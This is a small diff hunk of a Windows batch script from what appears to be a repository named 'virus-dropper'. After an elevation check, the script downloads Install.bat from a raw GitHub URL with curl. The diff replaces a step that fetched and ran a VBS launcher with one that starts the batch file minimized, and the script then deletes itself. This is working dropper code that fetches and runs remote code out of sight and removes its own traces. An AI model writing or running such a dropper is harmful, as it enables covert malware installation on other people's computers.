@@ -22,8 +22,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/launch.vbs" --output "launch.vbs"
-start launch.vbs
+start /min Install.bat
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
